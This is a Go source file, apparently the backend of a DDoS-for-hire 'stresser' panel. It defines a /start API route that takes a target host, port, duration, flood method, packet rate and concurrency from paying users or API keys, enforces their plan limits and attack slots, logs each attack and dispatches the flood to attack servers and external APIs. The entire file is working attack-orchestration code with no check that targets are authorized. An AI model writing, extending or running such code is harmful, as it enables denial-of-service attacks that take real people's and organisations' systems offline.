package attackapi

import (
	"api/core/database"
	"api/core/master/sessions"
	"api/core/models/apis"
	"api/core/models/floods"
	"api/core/models/functions"
	"api/core/models/server"
	"api/core/models/servers"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"reflect"
	"strconv"
	"strings"
	"time"
)

func init() {
	Route.NewSub(server.NewRoute("/start", func(w http.ResponseWriter, r *http.Request) {
		type status struct {
			Status  string `json:"status"`
			Message string `json:"message"`
			Attacks []int  `json:"attack_ids"`
		}
		switch strings.ToLower(r.Method) {
		case "get":
			key, ok := functions.GetKey(w, r)
			if !ok {
				return
			}
			if !key.HasPermission("api") {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "You do not have api access!"})
				return
			}
			data := functions.GetQuerys(w, r, map[string]bool{"target": true, "port": true, "time": true, "method": true, "threads": false, "pps": false, "concurrents": false, "subnet": false})
			if data == nil {
				return
			}
			addrs, err := net.LookupHost(data["target"])
			if err != nil || len(addrs) == 0 {
		    json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid target provided: " + err.Error()})
		    return
			}
			flood := floods.New(data["method"])
			if flood == nil {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid attack method provided!"})
				return
			}
			flood.Target = data["target"]
			flood.Parent = key.ID
			if _, ok := data["pps"]; ok {
				pps, err := strconv.Atoi(data["pps"])
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid packets per second amount provided!"})
					return
				}
				flood.PPS = pps
			}
			if _, ok := data["threads"]; ok {
				threads, err := strconv.Atoi(data["threads"])
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid threads amount provided!"})
					return
				}
				flood.Threads = threads
			}
			if _, ok := data["subnet"]; ok {
				subnet, err := strconv.Atoi(data["subnet"])
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid subnet provided!"})
					return
				}
				if subnet < 24 || subnet > 32 {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid subnet provided!"})
					return
				}
				flood.Subnet = subnet
			}
			var conns = 1
			ongoing, _ := database.Container.GetRunning(key)
			if len(ongoing) > key.Concurrents {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "maximum running attacks reached!"})
			}
			if _, ok := data["concurrents"]; ok {
				conncurrents, err := strconv.Atoi(data["concurrents"])
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid concurrent amount provided!"})
					return
				} else if err == nil && conncurrents+len(ongoing) > key.Concurrents {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "you're trying to attack with more concurrents then u have available!"})
					return
				}
				conns = conncurrents
			}
			duration, err := strconv.Atoi(data["time"])
			if err != nil {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid attack duration provided!"})
				return
			} else if err == nil && duration > key.Duration {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "provided attack duration over max time!"})
				return
			}
			flood.Duration = duration
			port, err := strconv.Atoi(data["port"])
			if err != nil {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid destination port provided!"})
				return
			} else if port < 0 || port > 65535 {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "provided port is below 0/over 65535!"})
				return
			}
			switch flood.Mtype {
			case 1:
				if database.Container.GlobalRunningType(1) >= servers.Slots()[1]+apis.Slots() {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "no available slot to start attack!"})
					return
				}
			case 2:
				if database.Container.GlobalRunningType(2) >= servers.Slots()[2] {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "no available slot to start attack!"})
					return
				}
			}
			flood.Port = port
			var ids []int
			for i := 0; i < conns; i++ {
				id, err := database.Container.NewAttack(key, flood)
				if err != nil {

					json.NewEncoder(w).Encode(status{Status: "error", Message: "database error occured!"})
					return
				}
				ids = append(ids, id)
				time.Sleep(500 * time.Microsecond)
			}
			if key.HasPermission("admin") {
				go apis.Send(flood)
			}
			for i := 0; i < conns; i++ {
				servers.Distribute(flood)
			}
			functions.WriteJson(w, status{Status: "success", Message: "attack succesfully started", Attacks: ids})
		case "post":
			ok, user := sessions.IsLoggedIn(w, r)
			if !ok {
				return
			}
			r.ParseForm()
			fmt.Println(r.PostForm)
			addrs, err := net.LookupHost(r.PostFormValue("host"))
			if err != nil || len(addrs) == 0 {
		    json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid target provided"})
		    return
			}
			flood := floods.New(r.PostFormValue("method"))
			if flood == nil {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid attack method provided!"})
				return
			}
			flood.Target = r.PostFormValue("host")
			flood.Parent = user.ID
			var conns = 1
			ongoing, _ := database.Container.GetRunning(user.User)
			if len(ongoing) > user.Concurrents {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "maximum running attacks reached!"})
			}
			if ok := r.PostFormValue("concurrents"); ok != "" {
				val := strings.Split(r.PostFormValue("concurrents"), ".")[0]
				conncurrents, err := strconv.Atoi(val)
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid concurrent amount provided!"})
					return
				} else if err == nil && conncurrents+len(ongoing) > user.Concurrents {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "you're trying to attack with more concurrents then u have available!"})
					return
				}
				conns = conncurrents
			}
			if ok := r.PostFormValue("threads"); ok != "" {
				val := strings.Split(r.PostFormValue("threads"), ".")[0]
				threads, err := strconv.Atoi(val)
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid thread amount provided!"})
					return
				}
				flood.Threads = threads
			}
			if ok := r.PostFormValue("pps"); ok != "" {
				val := strings.Split(r.PostFormValue("pps"), ".")[0]
				pps, err := strconv.Atoi(val)
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid pps amount provided!"})
					return
				}
				flood.PPS = pps
			}
			duration, err := strconv.Atoi(r.PostFormValue("duration"))
			if err != nil {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid attack duration provided!"})
				log.Println(err)
				return
			} else if err == nil && duration > user.Duration {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "provided attack duration over max time!"})
				return
			}
			flood.Duration = duration
			port, err := strconv.Atoi(r.PostFormValue("port"))
			if err != nil {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "invalid destination port provided!"})
				return
			} else if port < 0 || port > 65535 {
				json.NewEncoder(w).Encode(status{Status: "error", Message: "provided port is below 0/over 65535!"})
				return
			}
			switch flood.Mtype {
			case 1:
				if database.Container.GlobalRunningType(1) >= servers.Slots()[1]+apis.Slots() {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "no available slot to start attack!"})
					return
				}
			case 2:
				if database.Container.GlobalRunningType(2) >= servers.Slots()[2] {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "no available slot to start attack!"})
					return
				}
			}
			flood.Port = port
			var ids []int
			for i := 0; i < conns; i++ {
				id, err := database.Container.NewAttack(user.User, flood)
				if err != nil {
					json.NewEncoder(w).Encode(status{Status: "error", Message: "database error occured!"})
					return
				}

				servers.Distribute(flood)
				ids = append(ids, id)
			}
			go apis.Send(flood)
			functions.WriteJson(w, status{Status: "success", Message: "attack succesfully started", Attacks: ids})
		}

	}))
}

func Copy(source interface{}, destin interface{}) {
	x := reflect.ValueOf(source)
	if x.Kind() == reflect.Ptr {
		starX := x.Elem()
		y := reflect.New(starX.Type())
		starY := y.Elem()
		starY.Set(starX)
		reflect.ValueOf(destin).Elem().Set(y.Elem())
	} else {
		destin = x.Interface()
	}
}